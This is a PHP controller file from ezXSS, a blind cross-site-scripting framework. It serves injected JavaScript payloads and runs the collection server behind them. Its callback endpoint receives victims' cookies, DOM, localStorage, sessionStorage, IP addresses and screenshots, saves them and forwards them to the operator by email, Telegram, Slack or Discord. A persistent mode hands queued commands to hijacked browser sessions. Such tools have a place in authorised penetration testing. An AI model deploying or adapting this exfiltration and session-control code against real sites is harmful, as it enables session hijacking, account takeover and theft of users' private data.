<?php

class Trigger extends Controller
{
    /**
     * Summary of rows
     * 
     * @var array
     */
    private $rows = ['uri', 'ip', 'referer', 'user-agent', 'cookies', 'localstorage', 'sessionstorage', 'dom', 'origin'];

    /**
     * Add default headers to constructor
     */
    public function __construct()
    {
        parent::__construct();

        // CORS headers
        header('Access-Control-Allow-Origin: *');
        header('Access-Control-Allow-Headers: *');
        header('Access-Control-Allow-Methods: GET, POST');

        // Cache headers
        header('Cache-Control: no-cache, no-store, must-revalidate');
        header('Pragma: no-cache');
        header('Expires: 0');
    }

    /**
     * Renders the default payload and returns the content.
     *
     * @return string
     */
    public function index()
    {
        $this->view->renderPayload('index');
        $this->view->setContentType('application/x-javascript');

        // Get the payload data for the current URL
        $payload = $this->getPayloadByUrl(url);

        // Create the string of rows we dont collect
        $noCollect = [];
        foreach ($this->rows as $row) {
            if ($payload["collect_{$row}"] === 0) {
                $noCollect[] = "'$row'";
            }
        }

        // Create the string of pages we collect
        $pages = array_map(function ($page) {
            return "'" . addslashes($page) . "'";
        }, array_filter(explode('~', $payload['pages'] ?? '')));

        $screenshot = $payload['collect_screenshot'] ? $this->view->getPayload('screenshot') : '';

        // Create the persistent payload
        if ($payload['persistent']) {
            $persistent = $this->view->getPayload('persist');
        }

        $this->view->renderData('payload', url);
        $this->view->renderData('noCollect', implode(',', $noCollect), true);
        $this->view->renderData('pages', implode(',', $pages), true);
        $this->view->renderData('spider', $payload['spider']);
        $this->view->renderDataWithLines('customjs', $payload['customjs'], true);
        $this->view->renderDataWithLines('customjs2', $payload['customjs2'], true);
        $this->view->renderDataWithLines('globaljs', $this->model('Setting')->get('customjs'), true);
        $this->view->renderDataWithLines('globaljs2', $this->model('Setting')->get('customjs2'), true);
        $this->view->renderDataWithLines('screenshot', $screenshot, true);
        $this->view->renderDataWithLines('persistent', $persistent ?? '', true);

        // Load and render extensions
        $globalExtensions = !empty($this->model('Setting')->get('extensions')) ? explode(',', $this->model('Setting')->get('extensions')) : [];
        $payloadExtensions = !empty($payload['extensions']) ? explode(',', $payload['extensions']) : [];
        
        // Merge and remove duplicates
        $allExtensionIds = array_unique(array_merge($globalExtensions, $payloadExtensions));
        
        $extensionCode = '';
        foreach ($allExtensionIds as $extensionId) {
            try {
                $extension = $this->model('Extension')->getById($extensionId);

                if ($extension['enabled'] != 1) {
                    continue;
                }
                
                $code = $extension['code'] ?? '';
                
                // Remove lines that start with //
                $lines = preg_split("/\r\n|\n|\r/", $code);
                $filteredLines = array_filter($lines, function($line) {
                    return !str_starts_with(trim($line), '//');
                });
                $code = implode("\n", $filteredLines);
                
                $extensionCode .= $code . "\n";
            } catch (Exception $e) {
                continue;
            }
        }
        
        $this->view->renderDataWithLines('extensions', $extensionCode, true);

        return $this->view->getContent();
    }

    /**
     * Renders custom payload and returns the content.
     *
     * @param string $name Payload name
     * @return string
     */
    public function custom($name)
    {
        try {
            $this->view->renderPayload($name);
            $this->view->setContentType('application/x-javascript');
            return $this->view->getContent();
        } catch (Exception $e) {
            // On any type of error, fallback to default
            return $this->index();
        }
    }

    /**
     * Callback function that receives all incoming data
     *
     * @return string
     */
    public function callback()
    {
        // Set the content type to plain text
        $this->view->setContentType('text/plain');

        // Check method
        if (!isPOST()) {
            return 'github.com/ssl/ezXSS';
        }

        // Get the input data
        $input = file_get_contents('php://input');
        $data = json_decode($input, false);

        if (empty($data) || !is_object($data)) {
            // If JSON decode failed, check if it's form-encoded data
            if (!empty($input) && strpos($input, '=') !== false && strpos($input, '&') !== false) {
                parse_str($input, $formData);
                $data = (object)$formData;
            } else {
                $data = (object)$_POST;
            }
            
            if (empty($data) || !is_object($data)) {
                return 'github.com/ssl/ezXSS';
            }
        }

        // Set a default value for the screenshot
        $data->screenshot = $data->screenshot ?? '';

        // Get the user's IP address
        $data->ip = substr($data->ip ?? $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'], 0, 50);

        // Define URL and origin
        $data->uri = $data->uri ?? ($_SERVER['HTTP_REFERER'] ?? ($_SERVER['HTTP_ORIGIN'] ?? ''));
        $data->origin = str_replace(['https://', 'http://'], '', $data->origin ?? ($_SERVER['HTTP_ORIGIN'] ?? ''));
        $data->origin = ($data->origin === '' && !empty($data->uri)) ? (parse_url($data->uri ?? '')['host'] ?? '') : $data->origin;

        // Define and truncate very long strings
        $data->uri = substr($data->uri ?? '', 0, 1000);
        $data->referer = substr($data->referer ?? '', 0, 1000);
        $data->origin = substr($data->origin ?? '', 0, 255);
        $data->payload = substr($data->payload ?? '', 0, 255);
        $data->useragent = substr($data->{'user-agent'} ?? ($_SERVER['HTTP_USER_AGENT'] ?? ''), 0, 500);

        $data->extra = $data->extra ?? '';
        if(is_array($data->extra) || is_object($data->extra)) {
            $data->extra = json_encode($data->extra);
        }

        if(empty($data->payload)) {
            return 'github.com/ssl/ezXSS';
        }

        // Check allow and deny list
        $payload = $this->getPayloadByUrl($data->payload);

        $denylistDomains = explode('~', $payload['blacklist'] ?? '');
        $allowlistDomains = explode('~', $payload['whitelist'] ?? '');

        // Check for denylisted domains
        foreach ($denylistDomains as $blockedDomain) {
            if ($data->origin !== '' && $data->origin == $blockedDomain) {
                return 'github.com/ssl/ezXSS';
            }
            if (strpos($blockedDomain, '*') !== false) {
                $blockedDomain = str_replace('*', '(.*)', $blockedDomain);
                if (preg_match('/^' . $blockedDomain . '$/', $data->origin)) {
                    return 'github.com/ssl/ezXSS';
                }
            }
        }

        // Check for allowlisted domains
        if ($payload['whitelist'] !== '' && $payload['whitelist'] !== null) {
            $foundAllowlist = false;
            foreach ($allowlistDomains as $allowlistDomain) {
                if ($data->origin !== '' && $data->origin == $allowlistDomain) {
                    $foundAllowlist = true;
                }
                if (strpos($allowlistDomain, '*') !== false) {
                    $allowlistDomain = str_replace('*', '(.*)', $allowlistDomain);
                    if (preg_match('/^' . $allowlistDomain . '$/', $data->origin)) {
                        $foundAllowlist = true;
                    }
                }
            }
            if (!$foundAllowlist) {
                return 'github.com/ssl/ezXSS';
            }
        }

        // Check if callback should be threated as persistent mode
        if (isset($data->method) && $data->method === 'persist') {
            return $this->persistCallback($data);
        }

        // Check if the report should be saved or alerted
        $doubleReport = false;
        if ($this->model('Setting')->get('filter-save') == 0 || $this->model('Setting')->get('filter-alert') == 0) {
            $searchId = $this->model('Report')->searchForDublicates($data->cookies ?? '', $data->origin, $data->referer, $data->uri, $data->useragent, $data->dom ?? '', $data->ip);
            if ($searchId !== false) {
                if ($this->model('Setting')->get('filter-save') == 0 && $this->model('Setting')->get('filter-alert') == 0) {
                    return 'github.com/ssl/ezXSS';
                } else {
                    $doubleReport = $searchId;
                }
            }
        }

        if (($doubleReport !== false && ($this->model('Setting')->get('filter-save') == 1 || $this->model('Setting')->get('filter-alert') == 1)) || $doubleReport === false) {
            // Create an image from the screenshot data
            if (!empty($data->screenshot)) {
                try {
                    $screenshot = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $data->screenshot), true);
                    if(!$screenshot) {
                        throw new Exception('Invalid screenshot data posted to callback');
                    }
                    $data->screenshotBase = base64_encode($screenshot);
                    if($this->model('Setting')->get('storescreenshot') == 0) {
                        // Store screenshot as file on server
                        $data->screenshotData = time() . md5(
                            $data->uri . time() . bin2hex(openssl_random_pseudo_bytes(16))
                        ) . bin2hex(openssl_random_pseudo_bytes(5));
                        $saveImage = @fopen(__DIR__ . "/../../assets/img/report-{$data->screenshotData}.png", 'w');
                        if(!$saveImage) {
                            throw new Exception('Unable to save screenshots to server, check permissions');
                        }
                        fwrite($saveImage, $screenshot);
                        fclose($saveImage);
                    } else {
                        // Store screenshot as base64 in database
                        $data->screenshotData = $data->screenshotBase;
                    }
                } catch (Exception $e) {
                    $this->log($e->getMessage());
                    $data->screenshotData = '';
                }
            }

            // Save the report
            if (($doubleReport !== false && $this->model('Setting')->get('filter-save') == 1) || $doubleReport === false) {
                $shareId = sha1(bin2hex(openssl_random_pseudo_bytes(32)) . time()) . substr(md5(time()), 4, 10);
                $data->id = $this->model('Report')->add(
                    $shareId,
                    $data->cookies ?? '',
                    $data->dom ?? '',
                    $data->origin,
                    $data->referer,
                    $data->uri,
                    $data->useragent,
                    $data->ip,
                    $data->screenshotData ?? '',
                    json_encode($data->localstorage ?? ''),
                    json_encode($data->sessionstorage ?? ''),
                    $data->payload,
                    $data->extra ?? ''
                );
                $data->domain = host;
            } else {
                if ($doubleReport !== false && $this->model('Setting')->get('filter-alert') == 1) {
                    $data = (object) $this->model('Report')->getById($doubleReport);
                }
            }
            $data->time = time();
            $data->timestamp = date('c', strtotime('now'));

            $isCollected = strpos($data->referer, 'Collected page via ') !== false;

            // Send out alerts
            if ((($doubleReport !== false && $this->model('Setting')->get('filter-alert') == 1) || $doubleReport === false) && !$isCollected) {
                try {
                    $this->alert($data);
                } catch (Exception $e) {
                    $this->log($e->getMessage());
                }
            }
        }

        return 'github.com/ssl/ezXSS';
    }

    /**
     * Persistent callback function that receives all incoming data from persistent mode
     *
     * @param object $data The data coming from the callback function
     * @return string
     */
    private function persistCallback($data)
    {
        $data->type = $data->type ?? '';
        $tryInit = false;

        // A new request has been made
        if ($data->type === 'init') {
            $tryInit = true;
        }

        // Session is pinged and is waiting for pong
        if ($data->type === 'ping') {
            try {
                $session = $this->model('Session')->getByClientId($data->clientid ?? '', $data->origin);

                $this->model('Session')->set($session['id'], 'time', time());
                $this->model('Session')->set($session['id'], 'console', $data->console ?? '');

                if($session['archive'] == 1) {
                    $this->model('Session')->archiveByClientId($data->clientid ?? '', $data->origin);
                }

                return $this->model('Console')->getNext($data->clientid ?? '', $data->origin);
            } catch (Exception $e) {
                $tryInit = true;
            }
        }

        if ($tryInit) {
            // Save the request data
            $data->id = $this->model('Session')->add(
                $data->clientid ?? '',
                $data->cookies ?? '',
                $data->dom ?? '',
                $data->origin,
                $data->referer,
                $data->uri,
                $data->useragent,
                $data->ip,
                json_encode($data->localstorage ?? ''),
                json_encode($data->sessionstorage ?? ''),
                $data->payload,
                $data->console ?? ''
            );
        }

        return '';
    }

    /**
     * Send an alert message
     *
     * @param object $data The data to be displayed in the alert message
     * @return void
     */
    private function alert($data)
    {
        // Callback alerting
        if ($this->model('Setting')->get('alert-callback') == 1) {
            $this->callbackAlert();
        }

        // Check if the DOM should be truncated
        if ($this->model('Setting')->get('dompart') > 0 && strlen($data->dom ?? '') > $this->model('Setting')->get('dompart')) {
            $data->dom = substr($data->dom ?? '', 0, $this->model('Setting')->get('dompart')) .
                "\r\nView the full DOM on the report page";
        }

        $payload = $this->getPayloadByUrl($data->payload);
        
        $userIdToAlert = 0;
        try {
            if($payload['user_id'] !== 0) {
                $user = $this->model('User')->getById($payload['user_id']); 
                if($user['rank'] !== 0) {
                    $userIdToAlert = $payload['user_id'];
                }
            }
        } catch (Exception $e) {}

        // Email alerting
        if ($this->model('Setting')->get('alert-mail') == 1) {
            // Get all enabled alerts with this method of alerting
            $alerts = $this->model('Alert')->getByMethodId(1, $userIdToAlert);

            foreach ($alerts as $alert) {
                $this->mailAlert($data, $alert['value1']);
            }
        }

        // Telegram alerting
        if ($this->model('Setting')->get('alert-telegram') == 1) {
            // Get all enabled alerts with this method of alerting
            $alerts = $this->model('Alert')->getByMethodId(2, $userIdToAlert);

            foreach ($alerts as $alert) {
                $this->telegramAlert($data, $alert['value1'], $alert['value2']);
            }
        }

        // Slack alerting
        if ($this->model('Setting')->get('alert-slack') == 1) {
            // Get all enabled alerts with this method of alerting
            $alerts = $this->model('Alert')->getByMethodId(3, $userIdToAlert);

            foreach ($alerts as $alert) {
                $this->slackAlert($data, $alert['value1']);
            }
        }

        // Discord alerting
        if ($this->model('Setting')->get('alert-discord') == 1) {
            // Get all enabled alerts with this method of alerting
            $alerts = $this->model('Alert')->getByMethodId(4, $userIdToAlert);

            foreach ($alerts as $alert) {
                $this->discordAlert($data, $alert['value1']);
            }
        }
    }

    /**
     * Sends out alert to custom callback url
     * 
     * @return void
     */
    private function callbackAlert()
    {
        // Send alert to custom callback url
        $url = (parse_url($this->model('Setting')->get('callback-url'), PHP_URL_SCHEME) ? '' : 'https://') . $this->model('Setting')->get('callback-url');
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS | CURLPROTO_HTTP);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
        curl_setopt($ch, CURLOPT_POSTFIELDS, file_get_contents('php://input'));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_exec($ch);
    }

    /**
     * Sends out alert to telegram bot
     * 
     * @param object $data The data to be displayed in the alert message
     * @param string $bottoken Telegram bot token
     * @param string $chatid Telegram chat id
     * @return void
     */
    private function telegramAlert($data, $bottoken, $chatid)
    {
        // Create Telegram alert template
        $alertTemplate = $this->view->getAlert('telegram.md');
        $alertTemplate = $this->view->renderAlertData($alertTemplate, $data);

        // Send alert to telegram bot API
        $ch = curl_init("https://api.telegram.org/bot{$bottoken}/sendMessage");
        curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['chat_id' => $chatid, 'parse_mode' => 'markdown', 'text' => $alertTemplate]));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_exec($ch);

        // Send photo with screenshot
        if (!empty($data->screenshotBase)) {
            $screenshotFile = 'data://application/octet-stream;base64,' . $data->screenshotBase;
            $curlFile = new \CURLFile($screenshotFile, 'image/png', 'screenshot.png');

            $ch = curl_init("https://api.telegram.org/bot{$bottoken}/sendPhoto");
            curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS);
            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-type: multipart/form-data']);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
            curl_setopt($ch, CURLOPT_POSTFIELDS, ['chat_id' => $chatid, 'photo' => $curlFile, 'caption' => "Screenshot from XSS Report #{$data->id}"]);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_exec($ch);
        }
    }

    /**
     * Sends out alert to mail
     * 
     * @param object $data The data to be displayed in the alert message
     * @param string $email The email to send to
     * @return void
     */
    private function mailAlert($data, $email)
    {
        // Escapes data for alert
        $escapedData = json_decode(json_encode($data), false) ?? json_decode('{}', false);
        array_walk_recursive($escapedData, function (&$item) {
            if (is_string($item)) {
                $item = e($item);
            }
        });

        if (!empty($data->screenshotBase)) {
            $attachment = chunk_split($escapedData->screenshotBase);
            $escapedData->screenshot = '<img style="max-width:100%;" src="cid:ezXSS">';
        } else {
            $escapedData->screenshot = '';
        }

        // Create mail alert template
        $alertTemplate = $this->view->getAlert('mail.html');
        $alertTemplate = $this->view->renderAlertData($alertTemplate, $escapedData);

        // Headers
        $boundary = md5(uniqid(time(), true));
        $headers[] = 'MIME-Version: 1.0';
        $headers[] = 'From: ezXSS';
        $headers[] = "Content-Type: multipart/mixed; boundary=\"ez$boundary\"";

        // Multipart to include alert template
        $multipart[] = "--ez$boundary";
        $multipart[] = 'Content-Type: text/html; charset=utf-8';
        $multipart[] = 'Content-Transfer-Encoding: Quot-Printed';
        $multipart[] = "\n$alertTemplate\n";

        // Multipart to include screenshot
        if (!empty($data->screenshotBase)) {
            $multipart[] = "--ez$boundary";
            $multipart[] = 'Content-Type: image/png; file_name="screenshot.png"';
            $multipart[] = 'Content-ID: <ezXSS>';
            $multipart[] = 'Content-Transfer-Encoding: base64';
            $multipart[] = 'Content-Disposition: inline; filename="screenshot.png"';
            $multipart[] = "\n$attachment\n";
        }
        $multipart[] = "--ez$boundary--";

        // Send the mail
        mail(
            $email,
            '[ezXSS] XSS on ' . $escapedData->uri ?? '',
            implode("\n", str_replace(chr(0), '', $multipart)),
            implode("\n", $headers)
        );
    }

    /**
     * Sends out alert to Slack
     * 
     * @param object $data The data to be displayed in the alert message
     * @param string $webhookURL The webook url
     * @return void
     */
    private function slackAlert($data, $webhookURL)
    {
        // Create Slack alert template
        $alertTemplate = $this->view->getAlert('slack.md');
        $alertTemplate = $this->view->renderAlertData($alertTemplate, $data);

        // Send alert to Slack webhook
        $ch = curl_init($webhookURL);
        curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['type' => 'mrkdwn', 'text' => $alertTemplate]));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_exec($ch);
    }

    /**
     * Sends out alert to Discord
     * 
     * @param object $data The data to be displayed in the alert message
     * @param string $webhookURL The webook url
     * @return void
     */
    private function discordAlert($data, $webhookURL)
    {
        // Escapes data for alert
        $escapedData = json_decode(json_encode($data), false) ?? [];
        array_walk_recursive($escapedData, function (&$item) {
            if (is_string($item)) {
                $item = addslashes($item);
            }
        });

        // Check if a screenshot is provided
        if (!empty($data->screenshotBase)) {
            $screenshotFile = 'data://application/octet-stream;base64,' . $escapedData->screenshotBase;
            $curlFile = new \CURLFile($screenshotFile, 'image/png', 'screenshot.png');
            $escapedData->screenshot = 'attachment://screenshot.png';
        } else {
            $escapedData->screenshot = '';
        }

        // Create Discord alert template
        $alertTemplate = $this->view->getAlert('discord.json');
        $alertTemplate = $this->view->renderAlertData($alertTemplate, $escapedData);
        $discordMessage = json_encode(json_decode($alertTemplate), JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

        // Send alert to Discord webhook
        $ch = curl_init($webhookURL);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-type: multipart/form-data']);
        curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, !empty($curlFile) ? ['payload_json' => $discordMessage, 'file' => $curlFile] : ['payload_json' => $discordMessage]);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_exec($ch);
    }

    /**
     * Returns the payload array by url
     * 
     * @param string $payloadUrl The current payload url
     * @return array
     */
    private function getPayloadByUrl($payloadUrl)
    {
        // Split the URL into segments
        $splitUrl = explode('/', $payloadUrl ?? '');

        try {
            // Attempt to retrieve the payload by the full path
            $url = (array_key_exists(2, $splitUrl) ? $splitUrl[2] : '') . '/' . (array_key_exists(3, $splitUrl) ? $splitUrl[3] : '');
            $payload = $this->model('Payload')->getByPayload($url);
        } catch (Exception $e) {
            try {
                // If the payload is not found by the full path, try to retrieve it by the domain name
                $payload = $this->model('Payload')->getByPayload((array_key_exists(2, $splitUrl) ? $splitUrl[2] : ''));
            } catch (Exception $e) {
                // If the payload is still not found, fallback to the default payload
                $payload = $this->model('Payload')->getById(1);
            }
        }

        return $payload;
    }
}
